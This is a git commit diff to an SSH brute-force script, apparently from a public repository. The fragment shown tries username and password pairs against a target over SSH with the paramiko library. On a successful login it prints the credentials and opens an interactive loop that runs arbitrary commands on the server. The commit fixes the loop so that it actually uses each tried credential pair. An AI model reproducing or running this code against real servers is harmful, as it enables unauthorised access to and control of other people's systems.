6de9df77c6463f5c81601ef9f01e038009da61c6
Glitch422 <90115880+glitch422@users.noreply.github.com>
2022-05-06 13:05:05 +0300

    Update SSH_Brute_Force.py

--- SSH_Brute_Force.py
+++ SSH_Brute_Force.py
@@ -13,8 +13,8 @@ with open(username, 'r') as userlist:
                 try:
                     ssh_session = paramiko.SSHClient()
                     ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy)
-                    ssh_session.connect(ip, port, username, password)
-                    print(f'Login success!\nUsername: {username} , Password: {password}')
+                    ssh_session.connect(ip, port, u, p)
+                    print(f'Login success!\nUsername: {u} , Password: {p}')
                     while True:
                         command = input('Insert a command to execute on the server:\t')
                         stdin, stdout, stderr = ssh_session.exec_command(command)
